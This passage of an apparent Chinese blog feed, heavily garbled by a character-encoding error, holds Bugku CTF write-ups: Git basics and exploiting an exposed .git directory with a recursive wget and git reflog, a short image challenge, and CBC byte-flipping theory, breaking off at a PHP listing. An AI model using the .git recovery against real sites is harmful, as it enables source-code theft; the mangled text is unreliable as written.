å­˜å‚¨æ‰€æœ‰Gitçš„æ•°æ®å¯¹è±¡,å¯¹è±¡çš„SHA1å“ˆå¸Œå€¼çš„å‰ä¸¤ä½æ˜¯æ–‡ä»¶å¤¹åç§°ï¼ŒåŽ38ä½ä½œä¸ºå¯¹è±¡æ–‡ä»¶å</li><li>refs - å­˜å‚¨å„ä¸ªåˆ†æ”¯æŒ‡å‘çš„ç›®æ ‡æäº¤</li><li>branches - è¿˜æ²¡å‘çŽ°æœ‰ä»€ä¹ˆç”¨å¤„</li></ul><h3 id="GitåŸºæœ¬æ“ä½œ"><a href="#GitåŸºæœ¬æ“ä½œ" class="headerlink" title="GitåŸºæœ¬æ“ä½œ"></a>GitåŸºæœ¬æ“ä½œ</h3><p>å¯¹ç…§è¿™å¼ å›¾æ¥ç†è§£ä¸¤æ®µæäº¤ï¼Œå·¥ä½œåŒº(working tree)ï¼Œæš‚å­˜åŒºï¼ˆstage/indexï¼‰å’Œ branchä¹‹é—´çš„å…³ç³»<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\gitåŸºæœ¬æ“ä½œ.png" alt="gitåŸºæœ¬æ“ä½œ"></p><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤:"></a>å¸¸ç”¨å‘½ä»¤:</h3><ul><li><p>git ls-files -uæ˜¾ç¤ºå†²çªçš„æ–‡ä»¶ï¼Œ-sæ˜¯æ˜¾ç¤ºæ ‡è®°ä¸ºå†²çªå·²è§£å†³çš„æ–‡ä»¶</p></li><li><p>git diff å¯¹æ¯”å·¥ä½œåŒºå’Œstageæ–‡ä»¶çš„å·®å¼‚</p></li><li><p>git diff â€“cached å¯¹æ¯”stageå’Œbranchä¹‹é—´çš„å·®å¼‚</p></li><li><p>git ls-files â€“stage æ£€æŸ¥ä¿å­˜åœ¨stageçš„æ–‡ä»¶</p></li><li><p>git log æ˜¾ç¤ºåˆ°HEADæ‰€æŒ‡å‘çš„commitä¸ºæ­¢çš„æ‰€æœ‰commitè®°å½• ã€‚</p></li><li><p>git reset HEAD <file></file></p></li><li><p>git reset â€“hard HEADæ”¾å¼ƒå·¥ä½œåŒºå’Œindexçš„æ”¹åŠ¨,HEADæŒ‡é’ˆä»ç„¶æŒ‡å‘å½“å‰çš„commit.</p><h3 id="å®žé™…æ“ä½œæµç¨‹"><a href="#å®žé™…æ“ä½œæµç¨‹" class="headerlink" title="å®žé™…æ“ä½œæµç¨‹"></a>å®žé™…æ“ä½œæµç¨‹</h3></li></ul><h4 id="git-init"><a href="#git-init" class="headerlink" title="git init"></a>git init</h4><p>æ­¤å‘½ä»¤åˆå§‹åŒ–ä¸€ä¸ªæ–°æœ¬åœ°ä»“åº“ï¼Œå®ƒåœ¨å·¥ä½œç›®å½•ä¸‹æ•°æ®ç›®å½•ç”Ÿæˆä¸€ä¸ªåä¸º.gitçš„éšè—æ–‡ä»¶å¤¹ã€‚gitä¼šå°†æ‰€æœ‰çš„æ–‡ä»¶ï¼Œç›®å½•ï¼Œæäº¤ç­‰è½¬åŒ–ä¸ºgitå¯¹è±¡ï¼ŒåŽ‹ç¼©å­˜å‚¨åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹å½“ä¸­ã€‚<br>git init å‘½ä»¤åŽé¢ä¸åŠ å‚æ•°è¡¨ç¤ºæŠŠå½“å‰ç›®å½•å˜ä¸ºä»“åº“,å¦‚ä¸‹è¡¨ç¤ºåœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºtestä»“åº“<br>![git init](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\git init.png)</p><h4 id="git-add"><a href="#git-add" class="headerlink" title="git add"></a>git add</h4><p>åˆ›å»ºä¸€ä¸ªtest1.txtæ–‡ä»¶ï¼Œgit statusæŸ¥çœ‹å½“å‰çŠ¶æ€,æ­¤æ—¶test.txtæ–‡ä»¶ä½äºŽå·¥ä½œç›®å½•<br>![git add](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\git add.png)<br>é€šè¿‡git addè·Ÿè¸ªè¿™ä¸ªæ–‡ä»¶,æŠŠtest.txtæ–‡ä»¶æ”¾åˆ°æš‚å­˜åŒº.(å¯ä»¥ä½¿ç”¨git rm â€“cachedå‘½ä»¤æ¥å–æ¶ˆæš‚å­˜)<br>![git rm â€“cached](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\git rm â€“cached.png)</p><h4 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h4><p>åœ¨æš‚å­˜åŒºçš„æ–‡ä»¶ä½¿ç”¨git commitæäº¤åˆ°ç‰ˆæœ¬åº“(æ•°æ®ç›®å½•)ä¸­<br>-må‚æ•°è¡¨ç¤ºæäº¤çš„æ³¨é‡Š,å¦‚æžœä¸ä½¿ç”¨-må‚æ•°é‚£ä¹ˆä¼šè·³å‡ºé¡µé¢æç¤ºä¸»åŠ¨è¾“å…¥æ³¨é‡Š<br>![git commit](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\git commit.png)<br>ä¿®æ”¹test.txtæ–‡ä»¶<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\ä¿®æ”¹textæ–‡ä»¶.png" alt="ä¿®æ”¹textæ–‡ä»¶"></p><p>ä¿®æ”¹åŽï¼Œé€šè¿‡æŸ¥çœ‹git statuså¯ä»¥çœ‹åˆ°æ–‡ä»¶çŠ¶æ€è¢«æ”¹å˜äº†ã€‚æ ¹æ®æç¤ºçŸ¥é“æ–‡ä»¶å·²è¢«ä¿®æ”¹ï¼Œä½†æ˜¯æœªæäº¤ä¿®æ”¹åˆ°ç‰ˆæœ¬åº“ä¸­ã€‚<br>![git status](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\git status.png)</p><p>git diff,å¯¹æ¯”å·¥ä½œåŒºå’Œæš‚å­˜åŒºæ–‡ä»¶çš„å·®å¼‚,æŸ¥çœ‹æ–‡ä»¶è¢«ä¿®æ”¹çš„åœ°æ–¹<br>![git diff](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\git diff.png)</p><p>ç¡®è®¤ä¿®æ”¹æ— è¯¯åŽæäº¤åˆ°ç‰ˆæœ¬åº“çš„æ–¹æ³•å’Œæäº¤åˆå§‹æ–‡ä»¶ä¸€æ ·,éœ€è¦å…ˆæäº¤åˆ°æš‚å­˜åŒº,ç„¶åŽæäº¤åˆ°ç‰ˆæœ¬åº“.<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\æäº¤åˆ°ç‰ˆæœ¬åº“.png" alt="æäº¤åˆ°ç‰ˆæœ¬åº“"><br>å†ä¿®æ”¹ä¸€æ¬¡æ–‡ä»¶<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\å†ä¿®æ”¹ä¸€æ¬¡æ–‡ä»¶.png" alt="å†ä¿®æ”¹ä¸€æ¬¡æ–‡ä»¶"></p><p>æäº¤<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\æäº¤.png" alt="æäº¤"><br>git log æŸ¥çœ‹ä¸‹åŽ†å²è®°å½•,HEADæˆ‘çš„ç†è§£å°±æ˜¯æŒ‡é’ˆ,æŒ‡åˆ°æœ€åŽæäº¤çš„ç‰ˆæœ¬<br>![git log](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\git log.png)<br>git reset â€“hard,å›žé€€ç‰ˆæœ¬<br>å›žé€€åˆ°ä¸Šä¸€ä¸ªç‰ˆæœ¬,gei reset â€“hard HEAD^<br>![git reset â€“hard](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\git reset â€“hard.png)</p><p>åŽ‰å®³äº†,å¯ä»¥çœ‹åˆ°HEADæŒ‡é’ˆä¹ŸæŒ‡åˆ°äº†ç¬¬ä¸€æ¬¡ä¿®æ”¹çš„ç‰ˆæœ¬,ç¬¬äºŒæ¬¡ä¿®æ”¹çš„ç‰ˆæœ¬çœ‹ä¸åˆ°äº†<br>ä½†æ˜¯æˆ‘è¦æ˜¯å› ä¸ºæ“ä½œå¤±è¯¯æ€Žä¹ˆè¿½å›žåœ°äºŒæ¬¡ä¿®æ”¹çš„ç‰ˆæœ¬å‘¢,å¯ä»¥ä½¿ç”¨git reset â€“hard ç‰ˆæœ¬å·è¿½å›ž<br>git reflogèŽ·å–ç‰ˆæœ¬å·,å¾—åˆ°ç¬¬äºŒæ¬¡ä¿®æ”¹ç‰ˆæœ¬å·ä¸º5edcc89<br>![git reflog](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\git reflog.png)</p><p>get reset â€“hard 5edcc89æ¢å¤<br>![get reset â€“hard 5edcc89](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\get reset â€“hard 5edcc89.png)</p><p>æˆ‘åŽé¢æµ‹è¯•ä½¿ç”¨comitåŽé¢ä¸€ä¸²å¾ˆé•¿çš„å­—ç¬¦,è¿™é‡Œç†è§£ä¸ºå¯¹è±¡sha1å­—ç¬¦ä¸²å§.ä¹Ÿå¯ä»¥å›žé€€åˆ°é‚£ä¸ªç‰ˆæœ¬</p><p><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\å›žé€€åˆ°é‚£ä¸ªç‰ˆæœ¬.png" alt="å›žé€€åˆ°é‚£ä¸ªç‰ˆæœ¬"></p><p>å¯ä»¥æŠŠå·¥ä½œåŒºä¿®æ”¹çš„æ–‡ä»¶git addæäº¤åˆ°æš‚å­˜åŒºï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨git checkout â€” test1.txt æŠŠå·¥ä½œåŒºçš„ä¿®æ”¹æ’¤é”€ï¼Œè¿™æ ·ï¼Œæ–‡ä»¶å°±ä¼šå›žé€€åˆ°ä¸Šä¸€æ¬¡æäº¤æ—¶çš„çŠ¶æ€ã€‚<br>![git checkout â€” test1.txt](D:\blog\source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\git checkout â€” test1.txt.png)</p><h3 id="Gitä¿¡æ¯æ³„éœ²åŽŸç†"><a href="#Gitä¿¡æ¯æ³„éœ²åŽŸç†" class="headerlink" title="Gitä¿¡æ¯æ³„éœ²åŽŸç†"></a>Gitä¿¡æ¯æ³„éœ²åŽŸç†</h3><ul><li>é€šè¿‡æ³„éœ²çš„.gitæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ï¼Œè¿˜åŽŸé‡å»ºå·¥ç¨‹æºä»£ç </li><li>è§£æž.git/indexæ–‡ä»¶ï¼Œæ‰¾åˆ°å·¥ç¨‹ä¸­æ‰€æœ‰çš„ï¼ˆæ–‡ä»¶åï¼Œæ–‡ä»¶sha1ï¼‰</li><li>åŽ».git/objectsæ–‡ä»¶å¤¹ä¸‹ä¸‹è½½å¯¹åº”çš„æ–‡ä»¶</li><li>zlibè§£åŽ‹æ–‡ä»¶ï¼ŒæŒ‰åŽŸå§‹çš„ç›®å½•ç»“æž„å†™å…¥æºä»£ç <br>ï¼ˆå±å®³ï¼šæ¸—é€æµ‹è¯•äººå‘˜ã€æ”»å‡»è€…ï¼Œå¯ä»¥è¿›ä¸€æ­¥ä»£ç å®¡è®¡ï¼ŒæŒ–æŽ˜ï¼šæ–‡ä»¶ä¸Šä¼ ï¼Œsqlæ³¨å…¥ç­‰å®‰å…¨æ¼æ´žï¼‰</li></ul><h3 id="GitHackå·¥å…·ä½¿ç”¨"><a href="#GitHackå·¥å…·ä½¿ç”¨" class="headerlink" title="GitHackå·¥å…·ä½¿ç”¨"></a>GitHackå·¥å…·ä½¿ç”¨</h3><p>GitHackä¼šæŒ‰ç…§ä¸Šé¢çš„åŽŸç†è‡ªåŠ¨æ¢å¤<br><img src="/2021/04/14/bugku-web40-git-xie-lu/blog/source_posts\Bugkuï¼šWeb40-gitæ³„éœ²\GitHackå·¥å…·ä½¿ç”¨.png" alt="GitHackå·¥å…·ä½¿ç”¨"></p><h2 id="Web40"><a href="#Web40" class="headerlink" title="Web40"></a>Web40</h2><p>å‘çŽ°æœ‰/.git/ç›®å½•ï¼Œåº”è¯¥æ˜¯gitæ³„éœ²äº†ã€‚</p><p>wget -r <a href="http://ip_address/.git">http://ip_address/.git</a>ã€€ã€€:é€’å½’ä¸‹è½½è¯¥ç½‘ç«™ç›®å½•ä¸‹çš„æ–‡ä»¶åŠæ–‡ä»¶å¤¹</p><p>ä¹‹åŽè¿›å…¥æ–‡ä»¶å¤¹ä½¿ç”¨</p><p>git reflog:æŸ¥çœ‹æ‰§è¡Œçš„å‘½ä»¤æ—¥å¿—</p><p><a href="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121170625249-528964650.png"><img src="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121170625249-528964650.png" alt="img"></a></p><p> çœ‹åˆ°flag is hereï¼Ÿé‚£å°±åªèƒ½ä¸€ä¸ªä¸€ä¸ªè¯•äº†ï¼Œè¯•äº†ç¬¬äºŒä¸ªçš„æ—¶å€™ï¼Œæ‰¾åˆ°äº†</p><p>ä½¿ç”¨git show commit_id å‘½ä»¤æŸ¥çœ‹commit</p><p><a href="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121171515615-627590262.png"><img src="https://img2020.cnblogs.com/blog/2156042/202101/2156042-20210121171515615-627590262.png" alt="img"></a></p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/tac2664/p/14309112.html">https://www.cnblogs.com/tac2664/p/14309112.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Misc-è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡</title>
      <link href="2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/"/>
      <url>2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/</url>
      
        <content type="html"><![CDATA[<p>ä¸‹è½½ï¼š</p><p><img src="/2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/blog/source_posts\Bugkuï¼šMisc-è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡\1.png" alt="1"></p><p>ç”¨è®°äº‹æœ¬æ‰“å¼€ï¼š</p><p><img src="/2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/blog/source_posts\Bugkuï¼šMisc-è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡\2.png" alt="2"></p><p>è§£ç ï¼š</p><p><img src="/2021/04/13/bugku-misc-zhe-shi-yi-zhang-dan-chun-de-tu-pian/blog/source_posts\Bugkuï¼šMisc-è¿™æ˜¯ä¸€å¼ å•çº¯çš„å›¾ç‰‡\3.png" alt="3"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web39-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»</title>
      <link href="2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/"/>
      <url>2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„åŽŸç†"><a href="#CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„åŽŸç†" class="headerlink" title="CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„åŽŸç†"></a>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„åŽŸç†</h2><h5 id="CBCç¿»è½¬æ”»å‡»æ–¹æ³•çš„ç²¾é«“åœ¨äºŽï¼š"><a href="#CBCç¿»è½¬æ”»å‡»æ–¹æ³•çš„ç²¾é«“åœ¨äºŽï¼š" class="headerlink" title="CBCç¿»è½¬æ”»å‡»æ–¹æ³•çš„ç²¾é«“åœ¨äºŽï¼š"></a>CBCç¿»è½¬æ”»å‡»æ–¹æ³•çš„ç²¾é«“åœ¨äºŽï¼š</h5><p>é€šè¿‡æŸåå¯†æ–‡å­—èŠ‚æ¥æ”¹å˜æ˜Žæ–‡å­—èŠ‚ã€‚(æ³¨ï¼šå€ŸåŠ©CBCå†…éƒ¨çš„æ¨¡å¼)å€Ÿç”±æ­¤å¯ä»¥ç»•è¿‡è¿‡æ»¤å™¨ï¼Œæˆ–è€…æ”¹å˜ç”¨æˆ·æƒé™æå‡è‡³ç®¡ç†å‘˜ï¼Œåˆæˆ–è€…æ”¹å˜åº”ç”¨ç¨‹åºé¢„æœŸæ˜Žæ–‡)</p><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugkuï¼šWeb39-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\1.png" alt="1"></p><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugkuï¼šWeb39-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\2.png" alt="2"></p><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugkuï¼šWeb39-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\3.png" alt="3"></p><h5 id="CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„åŽŸç†ï¼š"><a href="#CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„åŽŸç†ï¼š" class="headerlink" title="CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„åŽŸç†ï¼š"></a>CBCå­—èŠ‚ç¿»è½¬æ”»å‡»çš„åŽŸç†ï¼š</h5><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugkuï¼šWeb39-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\CBCåŠ å¯†.png" alt="CBCåŠ å¯†"></p><ul><li>Plaintext:æ˜Žæ–‡</li><li>Ciphertext:å¯†æ–‡</li><li>Initialization Vector(IV):åˆå§‹åŒ–å‘é‡-ç”¨äºŽéšæœºåŒ–åŠ å¯†çš„æ¯”ç‰¹å—ï¼Œä¿è¯å³ä½¿å¯¹ç›¸åŒæ˜Žæ–‡å¤šæ¬¡åŠ å¯†ï¼Œä¹Ÿå¯ä»¥å¾—åˆ°ä¸åŒçš„å¯†æ–‡</li><li>Block Cipher Encryption:åˆ†ç»„å¯†ç åŠ å¯†</li></ul><ol><li>æ˜Žæ–‡1 XOR åˆå§‹åŒ–å‘é‡(IV)=&gt;åŠ å¯†å¯†æ–‡1=&gt;å¯†æ–‡1</li><li>æ˜Žæ–‡2 XOR åŠ å¯†å¯†æ–‡1=&gt;åŠ å¯†å¯†æ–‡2=&gt;å¯†æ–‡2</li><li>æ˜Žæ–‡3 XOR åŠ å¯†å¯†æ–‡2=&gt;åŠ å¯†å¯†æ–‡3=&gt;å¯†æ–‡3</li></ol><h5 id="åœ¨è¿™é‡Œé‡è¦çš„ä¸€ç‚¹æ˜¯ï¼ŒCBCå·¥ä½œäºŽä¸€ä¸ªå›ºå®šé•¿åº¦çš„æ¯”ç‰¹ç»„ï¼Œå°†å…¶ç§°ä¹‹ä¸ºå—ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åŒ…å«16å­—èŠ‚çš„å—ã€‚"><a href="#åœ¨è¿™é‡Œé‡è¦çš„ä¸€ç‚¹æ˜¯ï¼ŒCBCå·¥ä½œäºŽä¸€ä¸ªå›ºå®šé•¿åº¦çš„æ¯”ç‰¹ç»„ï¼Œå°†å…¶ç§°ä¹‹ä¸ºå—ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åŒ…å«16å­—èŠ‚çš„å—ã€‚" class="headerlink" title="åœ¨è¿™é‡Œé‡è¦çš„ä¸€ç‚¹æ˜¯ï¼ŒCBCå·¥ä½œäºŽä¸€ä¸ªå›ºå®šé•¿åº¦çš„æ¯”ç‰¹ç»„ï¼Œå°†å…¶ç§°ä¹‹ä¸ºå—ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åŒ…å«16å­—èŠ‚çš„å—ã€‚"></a>åœ¨è¿™é‡Œé‡è¦çš„ä¸€ç‚¹æ˜¯ï¼ŒCBCå·¥ä½œäºŽä¸€ä¸ªå›ºå®šé•¿åº¦çš„æ¯”ç‰¹ç»„ï¼Œå°†å…¶ç§°ä¹‹ä¸ºå—ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨åŒ…å«16å­—èŠ‚çš„å—ã€‚</h5><h5 id="æ•´ä¸ªåŠ å¯†çš„è¿‡ç¨‹ç®€å•è¯´æ¥å°±æ˜¯-å…±åŠ å¯†ä¸‰æ¬¡-ï¼š"><a href="#æ•´ä¸ªåŠ å¯†çš„è¿‡ç¨‹ç®€å•è¯´æ¥å°±æ˜¯-å…±åŠ å¯†ä¸‰æ¬¡-ï¼š" class="headerlink" title="æ•´ä¸ªåŠ å¯†çš„è¿‡ç¨‹ç®€å•è¯´æ¥å°±æ˜¯(å…±åŠ å¯†ä¸‰æ¬¡)ï¼š"></a>æ•´ä¸ªåŠ å¯†çš„è¿‡ç¨‹ç®€å•è¯´æ¥å°±æ˜¯(å…±åŠ å¯†ä¸‰æ¬¡)ï¼š</h5><ol><li>é¦–å…ˆå°†æ˜Žæ–‡åˆ†ç»„(å¸¸è§çš„ä»¥16å­—èŠ‚ä¸ºä¸€ç»„)ï¼Œä½æ•°ä¸è¶³çš„ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦å¡«å……ã€‚</li><li>ç”Ÿæˆä¸€ä¸ªéšæœºçš„åˆå§‹åŒ–å‘é‡(IV)å’Œä¸€ä¸ªå¯†é’¥ã€‚</li><li>å°†IVå’Œç¬¬ä¸€ç»„æ˜Žæ–‡å¼‚æˆ–ã€‚</li><li>ç”¨å¯†é’¥å¯¹3ä¸­xoråŽäº§ç”Ÿçš„å¯†æ–‡åŠ å¯†ã€‚</li><li>ç”¨4ä¸­äº§ç”Ÿçš„å¯†æ–‡å¯¹ç¬¬äºŒç»„æ˜Žæ–‡è¿›è¡Œxoræ“ä½œã€‚</li><li>ç”¨å¯†é’¥å¯¹5ä¸­äº§ç”Ÿçš„å¯†æ–‡åŠ å¯†ã€‚</li><li>é‡å¤4-7ï¼Œåˆ°æœ€åŽä¸€ç»„æ˜Žæ–‡ã€‚</li><li>å°†IVå’ŒåŠ å¯†åŽçš„å¯†æ–‡æ‹¼æŽ¥åœ¨ä¸€èµ·ï¼Œå¾—åˆ°æœ€ç»ˆçš„å¯†æ–‡ã€‚</li></ol><p>ä»Žç¬¬ä¸€å—å¼€å§‹ï¼Œé¦–å…ˆä¸Žä¸€ä¸ªåˆå§‹å‘é‡ivå¼‚æˆ–ï¼ˆivåªåœ¨ç¬¬ä¸€å¤„ä½œç”¨ï¼‰ï¼Œç„¶åŽæŠŠå¼‚æˆ–çš„ç»“æžœé…åˆkeyè¿›è¡ŒåŠ å¯†ï¼Œå¾—åˆ°ç¬¬ä¸€å—çš„å¯†æ–‡ï¼Œå¹¶ä¸”æŠŠåŠ å¯†çš„ç»“æžœä¸Žä¸‹ä¸€å—çš„æ˜Žæ–‡è¿›è¡Œå¼‚æˆ–ï¼Œä¸€ç›´è¿™æ ·è¿›è¡Œä¸‹åŽ»ã€‚å› æ­¤è¿™ç§æ¨¡å¼æœ€é‡è¦çš„ç‰¹ç‚¹å°±æ˜¯ï¼šå‰ä¸€å—çš„å¯†æ–‡ç”¨æ¥äº§ç”ŸåŽä¸€å—çš„å¯†æ–‡ã€‚</p><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugkuï¼šWeb39-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\CBCè§£å¯†.png" alt="CBCè§£å¯†"></p><ul><li>Decryption:è§£å¯†</li></ul><h5 id="CBCè§£å¯†çš„é‡ç‚¹åœ¨äºŽ-å‰ä¸€æ®µå¯†æ–‡å‚ä¸Žä¸‹ä¸€æ®µå¯†æ–‡çš„è¿˜åŽŸ"><a href="#CBCè§£å¯†çš„é‡ç‚¹åœ¨äºŽ-å‰ä¸€æ®µå¯†æ–‡å‚ä¸Žä¸‹ä¸€æ®µå¯†æ–‡çš„è¿˜åŽŸ" class="headerlink" title="CBCè§£å¯†çš„é‡ç‚¹åœ¨äºŽ:å‰ä¸€æ®µå¯†æ–‡å‚ä¸Žä¸‹ä¸€æ®µå¯†æ–‡çš„è¿˜åŽŸ:"></a>CBCè§£å¯†çš„é‡ç‚¹åœ¨äºŽ:å‰ä¸€æ®µå¯†æ–‡å‚ä¸Žä¸‹ä¸€æ®µå¯†æ–‡çš„è¿˜åŽŸ:</h5><ol><li>ä»Žå¯†æ–‡ä¸­æå–å‡ºIVï¼Œç„¶åŽå°†å¯†æ–‡åˆ†ç»„ã€‚</li><li>ä½¿ç”¨å¯†é’¥å¯¹ç¬¬ä¸€ç»„çš„å¯†æ–‡è§£å¯†ï¼Œç„¶åŽå’ŒIVè¿›è¡Œxorå¾—åˆ°æ˜Žæ–‡ã€‚</li><li>ä½¿ç”¨å¯†é’¥å¯¹ç¬¬äºŒç»„å¯†æ–‡è§£å¯†ï¼Œç„¶åŽå’Œ2ä¸­çš„å¯†æ–‡xorå¾—åˆ°æ˜Žæ–‡ã€‚</li><li>é‡å¤2-3ï¼Œç›´åˆ°æœ€åŽä¸€ç»„å¯†æ–‡ã€‚</li></ol><h5 id="åŽŸç†"><a href="#åŽŸç†" class="headerlink" title="åŽŸç†:"></a>åŽŸç†:</h5><p><img src="/2021/04/12/bugku-web39-cbc-zi-jie-fan-zhuan-gong-ji/blog/source_posts\Bugkuï¼šWeb39-CBCå­—èŠ‚ç¿»è½¬æ”»å‡»\CBCæ”»å‡».png" alt="CBCæ”»å‡»"></p><ul><li>Flipped ciphertext bits:ç¿»è½¬å¯†æ–‡ä½</li><li>Garbled decryption:ä¹±ç è§£å¯†</li><li>Flipped plaintext bits:ç¿»è½¬æ˜Žæ–‡ä½</li></ul><ol><li>å¯†æ–‡1=&gt;è§£å¯†å¯†æ–‡1=&gt;è§£å¯†å¯†æ–‡1 XOR åˆå§‹åŒ–å‘é‡(iv) = æ˜Žæ–‡1</li><li>å¯†æ–‡2=&gt;è§£å¯†å¯†æ–‡2=&gt;è§£å¯†å¯†æ–‡2 XOR å¯†æ–‡1 = æ˜Žæ–‡2</li><li>å¯†æ–‡3=&gt;è§£å¯†å¯†æ–‡3=&gt;è§£å¯†å¯†æ–‡3 XOR å¯†æ–‡2 = æ˜Žæ–‡3</li></ol><p>æˆ‘ä»¬æ”¹å˜å‰ä¸€å—Ciphertextä¸­çš„ä¸€ä¸ªå­—èŠ‚ï¼Œç„¶åŽå’Œä¸‹ä¸€å—è§£å¯†åŽçš„å¯†æ–‡xorï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªä¸åŒçš„æ˜Žæ–‡ï¼Œè€Œè¿™ä¸ªæ˜Žæ–‡æ˜¯æˆ‘ä»¬å¯ä»¥æŽ§åˆ¶çš„ã€‚åˆ©ç”¨è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°±æ¬ºéª—æœåŠ¡ç«¯æˆ–è€…ç»•è¿‡è¿‡æ»¤å™¨</p><blockquote><p>å½“æˆ‘ä»¬çš„ä¸€ä¸ªå€¼Cæ˜¯ç”±Aå’ŒBå¼‚æˆ–å¾—åˆ°<br>C = A XOR B<br>é‚£ä¹ˆ<br>A XOR B XOR Cå¾ˆæ˜Žæ˜¾æ˜¯=0çš„<br>å½“æˆ‘ä»¬çŸ¥é“Bå’ŒCä¹‹åŽï¼Œæƒ³è¦å¾—åˆ°Açš„å€¼ä¹Ÿå¾ˆå®¹æ˜“<br>A = B XOR C<br>å› æ­¤ï¼ŒA XOR B XOR Cç­‰äºŽ0ã€‚æœ‰äº†è¿™ä¸ªå…¬å¼ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨XORè¿ç®—çš„æœ«å°¾å¤„è®¾ç½®æˆ‘ä»¬è‡ªå·±çš„å€¼ï¼Œå³å¯æ”¹å˜ã€‚</p></blockquote><table><thead><tr><th align="center">A</th><th align="center">B</th><th align="center">C</th><th align="center">AâŠ•BâŠ•C</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">0</td><td align="center">1</td><td align="center">0</td></tr><tr><td align="center">1</td><td align="center">1</td><td align="center">0</td><td align="center">0</td></tr><tr><td align="center">0</td><td align="center">1</td><td align="center">1</td><td align="center">0</td></tr><tr><td align="center">0</td><td align="center">0</td><td align="center">0</td><td align="center">0</td></tr></tbody></table><h2 id="Web39"><a href="#Web39" class="headerlink" title="Web39"></a>Web39</h2><p>å¾¡å‰‘æ‰«æåŽå°å‘çŽ°.index.php.swp</p><p>ç”±äºŽwindowsæ‰“ä¸å¼€æ–‡ä»¶æ‰€ä»¥é‡‡ç”¨ç½‘ä¸Šçš„äº†:</p><pre><code>&lt;?phpdefine("SECRET_KEY", file_get_contents('/root/key'));define("METHOD", "aes-128-cbc");session_start();function get_random_iv(){    